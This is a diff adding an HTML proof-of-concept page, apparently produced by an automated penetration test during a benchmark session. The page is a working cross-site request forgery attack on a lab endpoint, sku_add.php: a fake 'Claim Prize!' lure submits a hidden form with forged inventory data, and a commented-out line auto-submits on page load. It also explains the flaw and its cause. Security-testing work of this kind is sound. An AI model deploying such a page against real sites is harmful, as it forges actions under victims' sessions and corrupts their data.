@@ -1,0 +1,90 @@
+<!-- 
+POC: HTML page demonstrating CSRF attack on sku_add.php - crafts hidden form that submits unauthorized SKU creation when visited by authenticated user
+Target: ./repo
+Created: 2025-12-02T16:30:43.828Z
+Session: benchmark-XBEN-092-24-miorxl1g
+
+To test this POC:
+1. Open this file in a web browser: file:///home/daytona/.pensar/executions/benchmark-XBEN-092-24-miorxl1g/pocs/poc_csrf_sku_add_attack.html
+2. Or serve it and navigate to the target application
+3. Observe the vulnerability demonstration (e.g., XSS alert, CSRF execution)
+-->
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Legitimate Website</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+        }
+        .hidden-form {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome to Our Website</h1>
+    <p>Click the button below to claim your free prize!</p>
+    <button onclick="document.getElementById('csrf-form').submit();">Claim Prize!</button>
+
+    <!-- Hidden CSRF Attack Form -->
+    <form id="csrf-form" class="hidden-form" action="http://vulnerable-app.local/sku_add.php" method="POST">
+        <!-- Attacker-controlled SKU data -->
+        <input type="hidden" name="sku" value="MALICIOUS_001">
+        <input type="hidden" name="name" value="Malicious SKU Created by CSRF">
+        <input type="hidden" name="description" value="This is a fake product added via CSRF attack. The attacker has polluted the inventory database.">
+        <!-- NO CSRF TOKEN - vulnerability! -->
+    </form>
+
+    <script>
+        // Alternative: Auto-submit on page load (even stealthier attack)
+        // Uncomment the line below for automatic exploitation when page loads
+        // window.onload = function() { document.getElementById('csrf-form').submit(); };
+    </script>
+
+    <hr>
+    <h2>Vulnerability Details</h2>
+    <p><strong>Vulnerable Endpoint:</strong> sku_add.php</p>
+    <p><strong>Vulnerability Type:</strong> Cross-Site Request Forgery (CSRF)</p>
+    <p><strong>Attack Vector:</strong> POST request without CSRF token validation</p>
+    
+    <h3>How this attack works:</h3>
+    <ol>
+        <li>Attacker crafts this malicious HTML page</li>
+        <li>Attacker tricks an authenticated user into visiting this page</li>
+        <li>User's browser automatically submits the hidden form to sku_add.php</li>
+        <li>Since the user is authenticated, their session cookie is included</li>
+        <li>sku_add.php accepts the POST request (NO CSRF token validation)</li>
+        <li>Unauthorized SKU record is created in the victim's account</li>
+        <li>User never knows what happened</li>
+    </ol>
+
+    <h3>Why this is dangerous:</h3>
+    <ul>
+        <li>Inventory pollution and data corruption</li>
+        <li>Creation of fake products in the system</li>
+        <li>Potential XSS via the description field</li>
+        <li>Administrative overhead to clean up malicious records</li>
+        <li>No audit trail showing who performed the action</li>
+    </ul>
+
+    <h3>Root Cause Analysis:</h3>
+    <p>The sku_add.php endpoint processes POST requests without:</p>
+    <ul>
+        <li>CSRF token validation</li>
+        <li>Checking Referer/Origin headers</li>
+        <li>Session token verification</li>
+        <li>Authorization checks</li>
+    </ul>
+
+    <h3>Proof of Concept:</h3>
+    <pre><code>&lt;form action="http://vulnerable-app.local/sku_add.php" method="POST"&gt;
+    &lt;input type="hidden" name="sku" value="CSRF_TEST"&gt;
+    &lt;input type="hidden" name="name" value="Created via CSRF"&gt;
+    &lt;input type="hidden" name="description" value="CSRF vulnerability demonstrated"&gt;
+    &lt;!-- NO CSRF TOKEN FIELD --&gt;
+&lt;/form&gt;</code></pre>
+</body>
+</html>
